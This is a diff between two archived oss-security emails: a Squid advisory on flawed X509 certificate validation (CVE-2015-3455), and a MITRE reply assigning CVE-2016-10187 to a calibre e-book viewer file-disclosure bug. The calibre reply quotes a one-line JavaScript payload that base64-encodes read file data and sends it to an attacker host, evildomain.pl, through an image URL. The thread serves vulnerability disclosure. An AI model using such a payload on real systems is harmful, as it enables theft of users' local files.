@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6108" "Saturday" "2" "May" "2015" "04:25:15" "+1200" "Amos Jeffries" "squid3@treenet.co.nz" "<5543A8EB.9080307@treenet.co.nz>" "184" "[oss-security] CVE-2015-3455 - SQUID-2015:1 Incorrect X509 server certificate validation" nil nil nil "5" "2015050116:25:15" "[oss-security] CVE-2015-3455 - SQUID-2015:1 Incorrect X509 server certificate validation" (number mark "        squid3@treen May  2  184/6108  " thread-indent "\"[oss-security] CVE-2015-3455 - SQUID-2015:1 Incorrect X509 server certificate validation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1590" "Tuesday" "31" "January" "2017" "10:19:04" "-0500" "cve-assign@mitre.org" "cve-assign@mitre.org" "<0cab773cce2c4a279f0667a388d3728c@imshyb01.MITRE.ORG>" "39" "[oss-security] Re: Requesting CVE for calibre file disclosure" nil nil nil "1" "2017013115:19:04" "[oss-security] Re: Requesting CVE for calibre file disclosure" (number mark "U       cve-assign@m Jan 31   39/1590  " thread-indent "\"[oss-security] Re: Requesting CVE for calibre file disclosure\"\n") "<20170129163444.GA1097@donald>" ("<20170129163444.GA1097@donald>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 13744 invoked by uid 550); 1 May 2015 16:25:47 -0000
+Received: (qmail 20479 invoked by uid 550); 31 Jan 2017 15:19:18 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,199 +11,55 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 13682 invoked from network); 1 May 2015 16:25:36 -0000
-Message-ID: <5543A8EB.9080307@treenet.co.nz>
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Thunderbird/31.6.0
-MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-Date: Sat, 02 May 2015 04:25:15 +1200
-From: Amos Jeffries <squid3@treenet.co.nz>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE-2015-3455 - SQUID-2015:1 Incorrect X509 server certificate validation
-To: oss-security@lists.openwall.com
+Received: (qmail 20424 invoked from network); 31 Jan 2017 15:19:16 -0000
+From: <cve-assign@mitre.org>
+To: <mpitt@debian.org>
+CC: <cve-assign@mitre.org>, <oss-security@lists.openwall.com>,
+	<anarcat@debian.org>
+In-Reply-To: <20170129163444.GA1097@donald>
+Message-ID: <0cab773cce2c4a279f0667a388d3728c@imshyb01.MITRE.ORG>
+Date: Tue, 31 Jan 2017 10:19:04 -0500
+MIME-Version: 1.0
+Content-Type: text/plain
+Subject: [oss-security] Re: Requesting CVE for calibre file disclosure
 
 -----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hash: SHA256
 
-__________________________________________________________________
+> Calibre 2.75 fixed what looks like a local data disclosure vulnerability:
+> 
+> https://github.com/kovidgoyal/calibre/commit/3a89718664cb8cce0449d1758eee585ed0d0433c
+> 
+> E-book viewer: Prevent javascript in the book from accessing files on the computer using XMLHttpRequest.
 
-    Squid Proxy Cache Security Update Advisory SQUID-2015:1
-__________________________________________________________________
+> https://bugs.launchpad.net/calibre/+bug/1651728
 
-Advisory ID:            SQUID-2015:1
-Date:                   May 01, 2015
-Summary:                Incorrect X509 server certificate validation
-Affected versions:      Squid 3.2 -> 3.2.13
-                        Squid 3.3 -> 3.3.13
-                        Squid 3.4 -> 3.4.12
-                        Squid 3.5 -> 3.5.3
-Fixed in version:       Squid 3.5.4, 3.4.13, 3.3.14, 3.2.14
-__________________________________________________________________
+>> When attacker change document.write in payload to this:
+>> document.write('<img src="http://evildomain.pl/some.jpg?data=' + btoa(data) + '">');
+>> could easily read data from server log.
 
-    http://www.squid-cache.org/Advisories/SQUID-2015_1.txt
-    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3455
-__________________________________________________________________
+Use CVE-2016-10187.
 
-Problem Description:
-
- Squid configured with client-first SSL-bump does not correctly
- validate X509 server certificate domain / hostname fields.
-
-__________________________________________________________________
-
-Severity:
-
- The bug is important because it allows remote servers to bypass
- client certificate validation. Some attackers may also be able
- to use valid certificates for one domain signed by a global
- Certificate Authority to abuse an unrelated domain.
-
- However, the bug is exploitable only if you have configured
- Squid to perform SSL Bumping with the "client-first" or "bump"
- mode of operation.
-
- Sites that do not use SSL-Bump are not vulnerable.
-
-__________________________________________________________________
-
-Updated Packages:
-
- This bug is fixed by Squid version 3.5.4, 3.4.13, 3.3.14, and
- 3.2.14.
-
- In addition, patches addressing this problem for stable releases
- can be found in our patch archives:
-
-Squid 3.2:
-http://www.squid-cache.org/Versions/v3/3.2/changesets/squid-3.2-11836.pa
-tch
-
-Squid 3.3:
-http://www.squid-cache.org/Versions/v3/3.3/changesets/squid-3.3-12690.pa
-tch
-
-Squid 3.4:
-http://www.squid-cache.org/Versions/v3/3.4/changesets/squid-3.4-13222.pa
-tch
-
-Squid 3.5:
-http://www.squid-cache.org/Versions/v3/3.5/changesets/squid-3.5-13817.pa
-tch
-
- If you are using a prepackaged version of Squid then please refer
- to the package vendor for availability information on updated
- packages.
-
-__________________________________________________________________
-
-Determining if your version is vulnerable:
-
- All Squid-2.x, 3.0 and 3.1 are not vulnerable to the problem.
-
-
-1) Run "squid -v" to determine if SSL support is enabled.
-
- All Squid built without SSL support are not vulnerable to the
- problem.
-
-
-2) Run "squid -k parse 2>&1 | grep ssl_bump" to determine if
-SSL-Bump is being used.
-
- All Squid-3.2, 3.3, 3.4, and 3.5 operating with ssl_bump omitted
- from squid.conf are not vulnerable to the problem.
-
- All unpatched Squid-3.x operating with "ssl_bump client-first"
- in squid.conf are vulnerable to the problem.
-
- All unpatched Squid-3.x operating with "ssl_bump bump" in
- squid.conf are vulnerable to the problem.
-
-__________________________________________________________________
-
-Workaround:
-
- There is no workaround for Squid-3.2.
-
- For Squid-3.3 and 3.4, upgrade the squid.conf settings to use
- "ssl_bump server-first".
-
- For Squid-3.5, upgrade the squid.conf settings to use a
- "ssl_bump peek" operation before the "bump" operation.
-
-  NOTE that these workarounds do not resolve the vulnerability,
-  but allow Squid to relay (or mimic) the invalid certificate to
-  clients and depends on validation in the client.
-
-
-Or,
-
- Disable SSL-Bump. Which may be done in the following ways:
-
- * Build Squid-3.2, 3.3, or 3.4 with ./configure --disable-ssl
-
- * Build Squid-3.5 with ./configure --without-openssl
-
- * Remove from squid.conf (and include'd files) any ssl_bump
-   directives.
-
-__________________________________________________________________
-
-Contact details for the Squid project:
-
- For installation / upgrade support on binary packaged versions
- of Squid: Your first point of contact should be your binary
- package vendor.
-
- If you install and build Squid from the original Squid sources
- then the squid-users@squid-cache.org mailing list is your primary
- support point. For subscription details see
- http://www.squid-cache.org/Support/mailing-lists.html.
-
- For reporting of non-security bugs in the latest release
- the squid bugzilla database should be used
- http://bugs.squid-cache.org/.
-
- For reporting of security sensitive bugs send an email to the
- squid-bugs@squid-cache.org mailing list. It's a closed list
- (though anyone can post) and security related bug reports are
- treated in confidence until the impact has been established.
-
-__________________________________________________________________
-
-Credits:
-
- The vulnerability was discovered and reported by a contributor
- who wishes to remain anonymous.
-
- The vulnerability was fixed and tested by
-  Amos Jeffries, Treehouse Networks Ltd. and
-  Christos Tsantilas, The Measurement Factory.
-
-__________________________________________________________________
-
-Revision history:
-
- 2015-04-29 01:35 GMT Initial Report
- 2015-05-01 13:49 GMT CVE Assignment
- 2015-05-01 12:50 GMT Patches and Packages Released
-__________________________________________________________________
-END
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v2.0.22 (MingW32)
+Version: GnuPG v1
 
-iQIcBAEBAgAGBQJVQ6jqAAoJEGvSOzfXE+nLE0IP/i/mOlx0qBpCXoTwPDwW+Uqu
-dC9OwLxH5uLl04YYYVHW3FFInewvrQHTJzEiFVIkIo+HSPLnhsaISEIaMzrzHvE3
-0Vuv8iyd9xoZDIfVHudLl9pI2fZvgYjGeuJf+Cyzmgb5UbTd80+fdfcJmd/sEnAL
-yRTdhjvonfPwI3KLbXDwT82l+8gmgMJRenlgtln8hUugEKfEXOv8qqPcI2RppcdB
-4/Wzy9TPiEOVDs4MVANKrgJw2qafwEj/tjjp0ndVEutMTecj09vwbeveElNvbOS7
-oY7vot5Y9xsFMdj2yKNpJF5yrC97P9mhXiI9X0PN1nuLndHhSxoIuxqFX3vgZ2SW
-s7YssV1AIRSQUhVfPJRDWdVIrLcuxWhPQCevBdLn9OfBZSGmr68VNDtIwXe4vMh+
-H+Rj6AiLB218jGNQ2t96H+DYROZhozqGh8umvAmbGkBRZmHjmCMX+DkXdEUq7q7A
-L0phrjN8A8bNK3lt+rkN5L5p7IDTqBu6YALDKRHmGYSTGiDgO1OcnbioVbRshGr/
-gcKVDi/SB9ix5PDNp12daaSf8w1jcB7gdRJnwH7Q41EDw3yu9VtRRTjPLLmozi/X
-7eVf+sBwzgeGXSGKZSEoHCx+TV95oDRHLTXdWKgVwrryZ3mqmfbHmR5CHk0e5RQ2
-2VTOkGz9fN6cta30Rt1b
-=/qom
+iQIcBAEBCAAGBQJYkKkAAAoJEHb/MwWLVhi2VMIQAJR5qTlhg0haVZfpsRXpX8YG
+O3JHHe2AW1NfvM8nYnxLK6MKfgBGIIh2oehQr9fG0wvKp0UF5Nmw8suFdiivfUFC
+N5KorT7Yb8xVJJzZmksPQ0mna8KAjJj5tw+1tentldFR0qbBnMxT0FiswF0rh815
+B5eVflvSH1gu3f9uEHpk3HSHZ0RagMwwA8XGe6h2AigShdQr6VCjP8SMafiu9pSA
+mXB+uFRso6bs5moyspW66DsuixeBBgFXn8QjoNhBWLA0Hj+d4Sz6BC0uUXCtPjy6
+6eWLZW2LOjiAlymGNgYuXXxDWslEBYe2LCnLntHKPff/JphuwwqdUz5dHHObktII
+uOXYrT7/Fyw6GLUtU3OulmqPbi4hOxEC2ERTse4l1RH9L6GpbBKY7Usq6xM9f9gx
+zYD+nQOVfR1aI/otMqsw0PaQSXyENId0Yv31+vwZTXk/TZ1dFBByaRCkjEAeTACR
+uh++QTFQKe2z91g+57jAQvAeD9hx6pepr3gV1b0QYjXgsDW2as+FDtWrYUVlVqdf
+NszEb+Z5sdVwEBFQVWqDudvZvUPnoaGgb7YrQxY85YSjoqrYk50iWArup2OMSxAb
+tMiMJjWuUiU17BPL/ih3OAdEJceUuyVjkmT/rTcjLbGHrCRPT+OZHyqDohzaQKbx
+k5XtJrNvWNusE+Q69k0e
+=tz/j
 -----END PGP SIGNATURE-----
